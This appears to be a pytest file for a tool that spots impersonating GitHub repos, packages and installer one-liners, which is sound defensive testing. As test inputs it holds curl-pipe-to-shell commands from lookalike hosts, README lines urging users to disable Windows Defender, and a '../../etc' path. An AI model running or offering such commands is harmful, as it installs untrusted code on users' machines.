"""The identity check end to end: lookalike pairs, the benign set, packages, one-liners."""

from __future__ import annotations

import base64
import json
from datetime import UTC, datetime
from pathlib import Path

import httpx
import pytest
from conftest import FIXTURES, HTTP_FIXTURES, Recorded

from lookfirst.core.http import make_client
from lookfirst.identity.check import check_identity, github_remote
from lookfirst.identity.github import GitHubData
from lookfirst.identity.popular_index import load_index
from lookfirst.targets.models import PackageSpec, ResolvedTarget, TargetSpec

NOW = datetime(2026, 11, 9, tzinfo=UTC)
PAIRS = FIXTURES / "identity" / "pairs"
API = "https://api.github.com"


def original_readme(full_name: str) -> str:
    recorded = Recorded("identity_originals")
    _status, _headers, body = recorded.responses[("GET", f"{API}/repos/{full_name}/readme")]
    return body.decode()


def pair_handler(pair: dict, *, stargazers: list[dict] | None = None):
    """Serve the made-up repo from the pair, and the real originals from recordings."""
    originals = Recorded("identity_originals")
    target = pair["target"]
    owner = target.split("/")[0]
    readme = pair["readme"]
    text = (
        readme["text"]
        if "text" in readme
        else original_readme(readme["copy_of"]) + readme["append"]
    )
    repo = {
        "full_name": target,
        "name": target.split("/")[1],
        "owner": {"login": owner},
        **pair["repo"],
    }

    def handler(request: httpx.Request) -> httpx.Response:
        url = str(request.url)
        if request.method == "POST" and url == f"{API}/graphql":
            nodes = stargazers if stargazers is not None else []
            return httpx.Response(
                200, json={"data": {"repository": {"stargazers": {"nodes": nodes}}}}
            )
        if (request.method, url) in originals.responses:
            return originals.handler(request)
        if url == f"{API}/repos/{target}":
            return httpx.Response(200, json=repo)
        if url == f"{API}/users/{owner}":
            return httpx.Response(200, json={"login": owner, **pair["owner"]})
        if url == f"{API}/repos/{target}/readme":
            return httpx.Response(200, text=text)
        if url == f"{API}/repos/{target}/commits?per_page=1":
            last = f'<{API}/repositories/1/commits?per_page=1&page={pair["commits"]}>; rel="last"'
            return httpx.Response(
                200, json=[{"sha": "0" * 40}], headers={"link": last} if pair["commits"] > 1 else {}
            )
        if url == f"{API}/repos/{target}/releases?per_page=10":
            return httpx.Response(200, json=pair["releases"])
        if url.startswith(f"{API}/search/repositories?"):
            return httpx.Response(
                200, json={"total_count": len(pair["search"]), "items": pair["search"]}
            )
        if "/compare/" in url:
            return httpx.Response(
                200, json={"files": [{"filename": f} for f in pair.get("compare_files", [])]}
            )
        if url.startswith(f"{API}/repos/") and url.endswith("/readme"):
            return httpx.Response(404)
        raise AssertionError(f"The pair didn't expect {request.method} {url}")

    return handler, repo


def run_pair(name: str, *, token: bool = False, stargazers: list[dict] | None = None):
    pair = json.loads((PAIRS / f"{name}.json").read_text())
    handler, repo = pair_handler(pair, stargazers=stargazers)
    client = httpx.Client(transport=httpx.MockTransport(handler))
    data = GitHubData(client, has_token=token)
    target = ResolvedTarget(
        TargetSpec(kind="github", raw=pair["target"]),
        root=None,
        resolved=pair["target"],
        metadata={"repo": repo},
    )
    return pair, check_identity(target, data, load_index(), now=NOW)


@pytest.mark.parametrize("name", sorted(p.stem for p in PAIRS.glob("*.json")))
def test_lookalike_pairs(name: str) -> None:
    pair, outcome = run_pair(name)
    expect = pair["expect"]
    assert outcome.result is not None
    assert outcome.result.status == expect["status"]
    assert outcome.result.original == expect["original"]
    assert sorted(f.id for f in outcome.findings) == sorted(expect["findings"]), [
        f.title for f in outcome.findings
    ]
    summary = [
        f
        for f in outcome.findings
        if f.id in ("identity.likely_impersonation", "identity.possible_impersonation")
    ]
    if expect["severity"]:
        assert summary[0].severity == expect["severity"]
        assert expect["original"] in summary[0].title  # the original is named
        assert "impersonation" in summary[0].title or "copy" in summary[0].title
        assert len(outcome.result.top_signals) <= 3
    else:
        assert summary == []


def test_inflated_stars_with_a_token_samples_the_stargazers() -> None:
    new = [
        {
            "createdAt": "2026-11-05T00:00:00Z",
            "followers": {"totalCount": 0},
            "repositories": {"totalCount": 0},
        }
    ]
    old = [
        {
            "createdAt": "2015-01-01T00:00:00Z",
            "followers": {"totalCount": 9},
            "repositories": {"totalCount": 12},
        }
    ]
    _, outcome = run_pair("inflated_stars", token=True, stargazers=new * 80 + old * 20)
    (stars,) = [f for f in outcome.findings if f.id == "identity.suspicious_stars"]
    assert (
        "80 of its last 100 stars come from new or empty accounts" in stars.evidence[0].data["what"]
    )
    assert outcome.gaps == []


def test_without_a_token_the_star_sample_is_listed_as_not_checked() -> None:
    _, outcome = run_pair("inflated_stars")
    assert (
        "Star sample",
        "needs a GitHub token",
        "set GITHUB_TOKEN, or run gh auth login",
    ) in outcome.gaps


def benign_names() -> list[str]:
    index = json.loads((HTTP_FIXTURES / "identity_benign" / "index.json").read_text())
    return sorted(
        {
            e["url"].removeprefix(f"{API}/repos/")
            for e in index
            if e["url"].count("/") == 5 and "/repos/" in e["url"]
        }
    )


@pytest.mark.parametrize("full_name", benign_names())
def test_popular_trusted_repos_are_never_called_copies(full_name: str) -> None:
    recorded = Recorded("identity_benign")
    client = httpx.Client(transport=httpx.MockTransport(recorded.handler))
    data = GitHubData(client, has_token=False)
    meta = data.repo(full_name)
    assert meta is not None
    target = ResolvedTarget(
        TargetSpec(kind="github", raw=full_name),
        root=None,
        resolved=full_name,
        metadata={"repo": meta},
    )
    outcome = check_identity(target, data, load_index(), now=NOW)
    assert outcome.result is not None
    assert outcome.result.status in ("original", "unrelated")
    assert [f.title for f in outcome.findings if f.severity in ("critical", "high")] == []


def test_the_benign_set_has_twenty_repos() -> None:
    assert len(benign_names()) == 20


# --- packages, one-liners and folders ------------------------------------------------


def package_target(ecosystem: str, name: str, source_repo: str) -> ResolvedTarget:
    spec = TargetSpec(
        kind=ecosystem, raw=f"{ecosystem}:{name}", package=PackageSpec(ecosystem, name)
    )  # type: ignore[arg-type]
    return ResolvedTarget(spec, root=None, resolved=name, source_repo=source_repo)


def test_a_package_claiming_an_official_repo_it_isnt_part_of() -> None:
    outcome = check_identity(
        package_target("npm", "ollama-desktop-pro", "ollama/ollama"), None, load_index(), now=NOW
    )
    assert outcome.result.status == "likely_impersonation"
    (claim,) = outcome.findings
    assert claim.id == "identity.claims_official_repo"
    assert claim.title == "Says it comes from ollama/ollama, but isn't its official package"
    assert claim.recommendation == "Install Ollama's official package instead."


@pytest.mark.parametrize(
    ("ecosystem", "name", "repo"),
    [
        ("npm", "ollama", "ollama/ollama-js"),
        ("pypi", "ollama", "ollama/ollama-python"),
        ("npm", "@modelcontextprotocol/server-everything", "modelcontextprotocol/servers"),
        ("pypi", "YT_DLP", "yt-dlp/yt-dlp"),
    ],
)
def test_official_packages_are_original(ecosystem: str, name: str, repo: str) -> None:
    outcome = check_identity(package_target(ecosystem, name, repo), None, load_index(), now=NOW)
    assert outcome.result.status == "original" and outcome.findings == []


def pypi_target(name: str, repo: str | None, organization: str | None = None) -> ResolvedTarget:
    target = package_target("pypi", name, repo)  # type: ignore[arg-type]
    target.metadata["pypi"] = {
        "info": {"name": name, "version": "1.0.0"},
        "file": {"filename": f"{name}-1.0.0.tar.gz"},
        "ownership": {"organization": organization, "roles": []},
    }
    return target


def npm_target(name: str, repo: str | None, *, provenance: bool = False) -> ResolvedTarget:
    target = package_target("npm", name, repo)  # type: ignore[arg-type]
    manifest: dict = {"name": name, "version": "1.0.0", "dist": {}}
    if provenance:
        manifest["dist"]["attestations"] = {
            "url": f"https://registry.npmjs.org/-/npm/v1/attestations/{name}@1.0.0",
            "provenance": {"predicateType": "https://slsa.dev/provenance/v1"},
        }
    target.metadata["npm"] = manifest
    return target


def registry(*, built_by: str | None = None, down: bool = False) -> GitHubData:
    """npm and PyPI answering "which repo built this?" with `built_by` (None: no record)."""

    def handler(request: httpx.Request) -> httpx.Response:
        url = str(request.url)
        if down:
            raise httpx.ConnectError("offline", request=request)
        if url.startswith("https://registry.npmjs.org/-/npm/v1/attestations/") and built_by:
            statement = {
                "predicate": {
                    "buildDefinition": {
                        "externalParameters": {
                            "workflow": {"repository": f"https://github.com/{built_by}"}
                        }
                    }
                }
            }
            payload = base64.b64encode(json.dumps(statement).encode()).decode()
            publish = "https://github.com/npm/attestation/tree/main/specs/publish/v0.1"
            return httpx.Response(
                200,
                json={
                    "attestations": [
                        {"predicateType": publish, "bundle": {}},
                        {
                            "predicateType": "https://slsa.dev/provenance/v1",
                            "bundle": {"dsseEnvelope": {"payload": payload}},
                        },
                    ]
                },
            )
        if url.startswith("https://pypi.org/integrity/"):
            if built_by is None:
                return httpx.Response(404)
            publisher = {"kind": "GitHub", "repository": built_by, "workflow": "release.yml"}
            return httpx.Response(
                200, json={"attestation_bundles": [{"publisher": publisher, "attestations": []}]}
            )
        raise AssertionError(f"Unexpected request: {request.method} {url}")

    return GitHubData(httpx.Client(transport=httpx.MockTransport(handler)), has_token=False)


@pytest.mark.parametrize(
    ("target", "original"),
    [
        # An npm scope or PyPI organization the project owns: only it can publish there.
        (npm_target("@anthropic-ai/sdk", "anthropics/anthropic-sdk-typescript"), None),
        (pypi_target("anthropic", "anthropics/anthropic-sdk-python", "Anthropic"), None),
        (pypi_target("comfyui-frontend-package", None, "Comfy-Org"), "Comfy-Org/ComfyUI"),
        # Listed in official.yaml, even though the package names no repo.
        (npm_target("@anthropic-ai/claude-code", None), "anthropics/claude-code"),
    ],
)
def test_packages_the_project_publishes_itself_are_original(
    target: ResolvedTarget, original: str | None
) -> None:
    outcome = check_identity(target, registry(), load_index(), now=NOW)
    assert outcome.result.status == "original" and outcome.findings == []
    assert outcome.result.original == (original or target.source_repo)


@pytest.mark.parametrize(
    "target",
    [
        npm_target("n8n-workflow", "n8n-io/n8n", provenance=True),
        pypi_target("mcp", "modelcontextprotocol/python-sdk"),
    ],
)
def test_a_package_its_registry_says_the_project_built_is_original(target: ResolvedTarget) -> None:
    outcome = check_identity(target, registry(built_by=target.source_repo), load_index(), now=NOW)
    assert outcome.result.status == "original" and outcome.findings == []
    assert outcome.result.original == target.source_repo


def test_a_package_built_elsewhere_that_names_an_official_repo() -> None:
    target = npm_target("n8n-pro-nodes", "n8n-io/n8n", provenance=True)
    outcome = check_identity(target, registry(built_by="someone/n8n-pro"), load_index(), now=NOW)
    assert outcome.result.status == "likely_impersonation"
    (claim,) = outcome.findings
    assert claim.id == "identity.claims_official_repo"
    assert [e.ref for e in claim.evidence] == [
        "https://github.com/n8n-io/n8n",
        "https://github.com/someone/n8n-pro",
    ]


def test_a_pypi_package_with_no_provenance_naming_an_official_repo() -> None:
    target = pypi_target("ollama-free", "ollama/ollama")
    outcome = check_identity(target, registry(), load_index(), now=NOW)
    assert [f.id for f in outcome.findings] == ["identity.claims_official_repo"]


def test_when_the_registry_cant_be_reached_nothing_is_claimed() -> None:
    target = npm_target("n8n-workflow", "n8n-io/n8n", provenance=True)
    outcome = check_identity(target, registry(down=True), load_index(), now=NOW)
    assert outcome.result is None and outcome.findings == []
    ((what, reason, _how),) = outcome.gaps
    assert what == "Where the package was built"
    assert reason.startswith("couldn't ask the registry: Couldn't connect to registry.npmjs.org")


def command_target(command: str) -> ResolvedTarget:
    return ResolvedTarget(
        TargetSpec(kind="oneliner", raw=command, command=command), root=None, resolved=None
    )


@pytest.mark.parametrize(
    ("command", "rule", "status"),
    [
        (
            "curl -fsSL https://ollama-install.dev/install.sh | sh",
            "identity.lookalike_installer_site",
            "likely_impersonation",
        ),
        (
            "curl -fsSL https://get-claudecode.app/install.sh | bash",
            "identity.lookalike_installer_site",
            "likely_impersonation",
        ),
        (
            "curl -fsSL https://raw.githubusercontent.com/someone/ollama-setup/main/i.sh | sh",
            "identity.lookalike_installer_link",
            None,
        ),
    ],
)
def test_one_liners_that_imitate_an_official_installer(
    command: str, rule: str, status: str | None
) -> None:
    outcome = check_identity(command_target(command), None, load_index(), now=NOW)
    assert [f.id for f in outcome.findings] == [rule]
    assert (outcome.result.status if outcome.result else None) == status


@pytest.mark.parametrize(
    "command",
    [
        "curl -fsSL https://ollama.com/install.sh | sh",
        "curl -fsSL https://claude.ai/install.sh | bash",
        "curl -fsSL https://raw.githubusercontent.com/ollama/ollama/main/scripts/install.sh | sh",
        "curl -fsSL https://example.com/install.sh | sh",
    ],
)
def test_official_or_unrelated_one_liners_are_left_alone(command: str) -> None:
    outcome = check_identity(command_target(command), None, load_index(), now=NOW)
    assert outcome.findings == [] and outcome.result is None


def test_a_local_folder_uses_its_github_remote(tmp_path: Path) -> None:
    (tmp_path / ".git").mkdir()
    (tmp_path / ".git" / "config").write_text(
        '[remote "origin"]\n\turl = git@github.com:pallets/flask.git\n'
    )
    assert github_remote(tmp_path) == "pallets/flask"
    recorded = Recorded("identity_benign")
    data = GitHubData(
        httpx.Client(transport=httpx.MockTransport(recorded.handler)), has_token=False
    )
    spec = TargetSpec(kind="local", raw=str(tmp_path), path=tmp_path)
    outcome = check_identity(
        ResolvedTarget(spec, root=tmp_path, resolved=str(tmp_path)), data, load_index(), now=NOW
    )
    assert outcome.result is not None and outcome.result.status == "original"


def test_a_local_folder_without_a_remote_still_gets_its_readme_checked(tmp_path: Path) -> None:
    (tmp_path / "README.md").write_text(
        "# Tool\n\nTurn off Windows Defender, then run setup.exe.\n"
    )
    spec = TargetSpec(kind="local", raw=str(tmp_path), path=tmp_path)
    outcome = check_identity(
        ResolvedTarget(spec, root=tmp_path, resolved=str(tmp_path)), None, load_index(), now=NOW
    )
    assert [f.id for f in outcome.findings] == ["identity.disable_protection"]
    assert outcome.gaps == [
        ("Comparing it with the project it might copy", "this folder has no GitHub remote", None)
    ]


@pytest.mark.parametrize(
    ("readme", "found"),
    [
        ("Download the zip, password: infected123\n", ["identity.archive_password"]),
        (
            "The archive is password-protected. Password: `2026`\n",
            ["identity.archive_password"],
        ),
        ("Unzip it. The password is **lookfirst**\n", ["identity.archive_password"]),
        # Mentioning passwords without handing one out isn't an archive password.
        ("The archive is password-protected. Extract it with 7-Zip.\n", []),
        (
            "* [Oka Unarchiver](https://okaapps.com) - Archive utility with RAR support "
            "and password-protected archives.\n",
            [],
        ),
        ("The password is required to extract the files.\n", []),
        ("```yaml\ndb:\n  password: changeme  # unzip the archive first\n```\n", []),
        ("Set your password: in the settings page.\n", []),
        ("Models: https://drive.google.com/file/d/abc/view\n", ["identity.offsite_download"]),
        ("Book: https://www.dropbox.com/s/9vq430e9/book.pdf\n", ["identity.offsite_download"]),
        ("Old link: https://mega.nz/#!abc!key\n", ["identity.offsite_download"]),
        # A file-sharing site's own pages aren't shared files.
        (
            "Sync with [Dropbox](https://www.dropbox.com/), see https://tech.dropbox.com/ "
            "and https://gofile.io/api\n",
            [],
        ),
        ("Join us on https://discord.gg/abc\n", []),
        # A malformed address doesn't stop the check.
        (
            "Mirrors: http://[oops and https://drive.google.com/file/d/abc\n",
            ["identity.offsite_download"],
        ),
        (
            "Please add an exclusion for the folder in Windows Defender.\n",
            ["identity.disable_protection"],
        ),
        ("This tool never asks you to disable your antivirus.\n", ["identity.disable_protection"]),
    ],
)
def test_readme_download_instructions(tmp_path: Path, readme: str, found: list[str]) -> None:
    (tmp_path / "README.md").write_text("# Tool\n\n" + readme)
    spec = TargetSpec(kind="local", raw=str(tmp_path), path=tmp_path)
    outcome = check_identity(
        ResolvedTarget(spec, root=tmp_path, resolved=str(tmp_path)), None, load_index(), now=NOW
    )
    assert [f.id for f in outcome.findings] == found


# --- the GitHub data layer -------------------------------------------------------------


def test_answers_are_cached_and_revalidated_with_etags(tmp_path: Path) -> None:
    sent: list[httpx.Request] = []

    def handler(request: httpx.Request) -> httpx.Response:
        sent.append(request)
        if request.headers.get("if-none-match") == '"v1"':
            return httpx.Response(304)
        return httpx.Response(200, json={"full_name": "a/b"}, headers={"etag": '"v1"'})

    with make_client() as _:
        client = httpx.Client(transport=httpx.MockTransport(handler))
    data = GitHubData(client, has_token=False, cache=tmp_path)
    assert data.repo("a/b") == {"full_name": "a/b"}
    assert data.repo("a/b") == {"full_name": "a/b"}  # from the cache, after a 304
    assert [r.headers.get("if-none-match") for r in sent] == [None, '"v1"']


def test_rate_limits_are_explained() -> None:
    from lookfirst.core.errors import FetchError

    client = httpx.Client(
        transport=httpx.MockTransport(
            lambda r: httpx.Response(403, headers={"x-ratelimit-remaining": "0"})
        )
    )
    with pytest.raises(FetchError, match="limit"):
        GitHubData(client, has_token=False).repo("a/b")


def test_unknown_repos_are_none_and_bad_names_are_never_requested() -> None:
    sent: list[httpx.Request] = []

    def handler(request: httpx.Request) -> httpx.Response:
        sent.append(request)
        return httpx.Response(404)

    data = GitHubData(httpx.Client(transport=httpx.MockTransport(handler)), has_token=False)
    assert data.repo("a/b") is None
    assert data.repo("../../etc") is None
    assert len(sent) == 1
